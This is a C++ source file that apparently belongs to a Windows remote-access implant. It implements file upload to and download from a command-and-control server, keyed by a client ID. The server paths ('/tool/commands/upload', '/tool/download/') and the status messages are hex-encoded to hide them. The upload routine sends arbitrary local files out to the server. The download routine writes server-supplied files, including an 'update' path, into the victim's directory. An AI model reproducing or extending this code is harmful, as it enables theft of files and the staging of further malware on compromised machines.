#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <string>
#include <iostream>
#include "Utils.h"
#include "HttpRequests.h"
#include "UploadDownload.h"
#include "PublicStructures.h"
#include "Encryptions.h"
#include "JsonFunctions.h"
#define BUFFER_SIZE_1KB 1024

using namespace std;

bool UploadDownload::upload_to_server(string filePath, PublicStructers::client clientInfo)
{
	bool bResults;
	HINTERNET  hRequest = NULL;
	DWORD dwSize = 0;
	DWORD dwContentLength = 0;
	DWORD dwBytesToRead = 0;
	DWORD dwBytesRead = 0;
	DWORD dwBytesWritten = 0;
	DWORD dwBoundaryValue = 0;
	DWORD dwFileSize = 0;
	LPCWSTR wszProxyAddress = 0;
	PUCHAR pResponse = 0;
	PCHAR pFormHeader = 0;
	PCHAR pFinalBoundary = 0;
	PUCHAR pBuf = 0;
	wchar_t* pContentHeader = 0;
	int res;
	char* content;
	FILE* new_file;
	long lSize;
	size_t result;
	vector<string> out;
	string tempString = filePath;
	string filename = Utils::parseFileName(filePath);
	if (filename.empty())
		filename = Encryptions::hexToAscii("556e6b6f776e5f66696c65");
	DWORD dwStatusCode = 0, dwTemp = 0;
	LPSTR data = (char*)calloc(10000000, sizeof(char));
	string pszFormHeader = "------Boundary%08X\r\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"";
	pszFormHeader += filename;
	pszFormHeader += "\"";
	pszFormHeader += "\r\nContent-Type:text/plain\r\n\r\n";
	char* pszFinalBoundary = (char*)"\r\n------Boundary%08X--\r\n";
	wchar_t* wszContentHeader = (wchar_t*)L"Content-Type: multipart/form-data; boundary=----Boundary%08X";
	wchar_t wszContentLength[256] = { 0 };

	pFormHeader = (PCHAR)calloc(BUFFER_SIZE_1KB, 1);
	pFinalBoundary = (PCHAR)calloc(BUFFER_SIZE_1KB, 1);
	pContentHeader = (wchar_t*)calloc(BUFFER_SIZE_1KB, 1);
	dwBoundaryValue = GetTickCount();
	sprintf_s(pFormHeader, BUFFER_SIZE_1KB, pszFormHeader.c_str(), dwBoundaryValue, dwBoundaryValue);
	sprintf_s(pFinalBoundary, BUFFER_SIZE_1KB, pszFinalBoundary, dwBoundaryValue);
	res = wsprintf(pContentHeader, wszContentHeader, dwBoundaryValue);
	if (wszProxyAddress != NULL && wcslen(wszProxyAddress) < 4)
	{
		wszProxyAddress = NULL;
	}
	if(fopen_s(&new_file, tempString.c_str(), "rb") != 0)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
		return false;
	}

	if (fseek(new_file, 0, SEEK_END) != 0)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
	}
	lSize = ftell(new_file);
	dwFileSize = lSize;
	rewind(new_file);
	content = (char*)malloc(sizeof(char) * (lSize + 1));
	if (content == NULL)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
		return false;
	}
	result = fread(content, 1, lSize, new_file);
	fflush(stdout);
	if (result != lSize)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
		return false;
	}
	content[lSize] = '\0';
	fclose(new_file);
	if (dwFileSize == 0)
	{
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	hRequest = WinHttpOpenRequest(clientInfo.session, L"POST", Utils::s2ws(Encryptions::hexToAscii("2F746F6F6C2F636F6D6D616E64732F75706C6F6164")).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE | WINHTTP_FLAG_REFRESH);
	if (!hRequest)
	{
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}

	hRequest = WinHttpRequests.AddDefaultHeaders(hRequest, clientInfo.clientId);

	if (!WinHttpAddRequestHeaders(hRequest, pContentHeader, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE))
	{
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	dwContentLength = (DWORD)(strlen(pFormHeader) + dwFileSize + strlen(pFinalBoundary));
	pBuf = (PUCHAR)calloc(dwContentLength + lSize, 1);
	sprintf((PCHAR)pBuf, "%s", pFormHeader);
	int len = (int)strlen((char*)pBuf);
	memcpy(&pBuf[len], content, lSize);
	sprintf((PCHAR)&pBuf[len + lSize], "%s", pFinalBoundary);
	wsprintf((LPWSTR)wszContentLength, L"Content-Length: %d", dwContentLength);
	bResults = WinHttpSendRequest(hRequest, wszContentLength, -1, pBuf, dwContentLength, dwContentLength, 0);
	if (!bResults)
	{
		free(pFormHeader);
		free(pFinalBoundary);
		free(pContentHeader);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	string response = WinHttpRequests.ReadDataFromResponse(hRequest);
	if (!response.empty())
		return true;
	return false;
}

bool UploadDownload::upload_to_client(string filename, PublicStructers::client clientInfo, bool fromDownloadsPath, string specialSaveDirectory)
{
	HINTERNET  Wrequest;
	string savePath;
	bool Wsendreq, Wresponse = false;
	DWORD sizeResp, dwTemp, downloaded = 0, dwStatusCode = 0, len_response = 0;
	LPBYTE pszOutBuffer;
	string url;
	if (fromDownloadsPath)
		url = Encryptions::hexToAscii("2F746F6F6C2F646F776E6C6F61642F") + clientInfo.clientId + "/" + filename;
	else
		url = Encryptions::hexToAscii("2F746F6F6C2F646F776E6C6F61642F777570646174652F");

	Wrequest = WinHttpOpenRequest(clientInfo.session, L"GET", Utils::s2ws(url).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (Wrequest == NULL)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	Wrequest = WinHttpRequests.AddDefaultHeaders(Wrequest, clientInfo.clientId);
	Wsendreq = WinHttpSendRequest(Wrequest, WINHTTP_NO_ADDITIONAL_HEADERS, -1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	if (!Wsendreq)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}
	else
	{
		Wresponse = WinHttpReceiveResponse(Wrequest, NULL);
		if (!Wresponse)
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			return false;
		}
		else
		{
			dwTemp = sizeof(dwStatusCode);
			if (!WinHttpQueryHeaders(Wrequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL))
			{
#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
				return false;
			}
			if (dwStatusCode == 200)
			{
				if (!specialSaveDirectory.empty())
				{
					if (Utils::dirExists(specialSaveDirectory))
						savePath = specialSaveDirectory;
					else
						savePath = mainDirectory;
				}
				else
					savePath = mainDirectory;
				HANDLE hFile = CreateFileW(
					Utils::s2ws(savePath + "\\" + filename).c_str(),
					GENERIC_WRITE,
					FILE_SHARE_READ,
					NULL,
					CREATE_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				if (hFile == INVALID_HANDLE_VALUE)
				{
#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
					WinHttpCloseHandle(Wrequest);
					return false;
				}
				do
				{
					sizeResp = 0;
					if (!WinHttpQueryDataAvailable(Wrequest, &sizeResp))
					{
					#ifdef _DEBUG
						Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
					#endif 
						return false;
					}
					pszOutBuffer = (LPBYTE) new ::byte[sizeResp + 1];
					if (!pszOutBuffer)
					{
						#ifdef _DEBUG
							Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
						#endif
						return false;
					}
					else
					{
						ZeroMemory(pszOutBuffer, sizeResp + 1);
						if (!WinHttpReadData(Wrequest, (LPVOID)pszOutBuffer, sizeResp, &downloaded))
						{
#ifdef _DEBUG
							Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
						}
						else
						{
							DWORD bytesWritten;
							if (!WriteFile(hFile, pszOutBuffer, sizeResp, &bytesWritten, NULL))
							{
								CloseHandle(hFile);
								free(pszOutBuffer);
								return false;
							}
						}
						delete [] pszOutBuffer;
					}
				} while (sizeResp > 0);
				CloseHandle(hFile);
			}
			else
			{
				return false;
			}
		}
	}
	WinHttpCloseHandle(Wrequest);
	return true;
}

void UploadDownload::uploadToServerThread(string filePath, PublicStructers::client clientInfo)
{
	string finalData;
	if (upload_to_server(filePath, clientInfo))
		finalData = Encryptions::hexToAscii("446f776e6c6f616465642066696c65207375636365737366756c6c7921");
	else
		finalData = Encryptions::hexToAscii("446f776e6c6f616465642066696c65206661696c656421");
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}

void UploadDownload::downloadToClientThread(string filename, PublicStructers::client clientInfo)
{
	string finalData;
	if (upload_to_client(filename, clientInfo))
		finalData = Encryptions::hexToAscii("55706c6f616465642066696c65207375636365737366756c6c7921");
	else
		finalData = Encryptions::hexToAscii("4661696c656420746f2075706c6f61642066696c6521");
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}
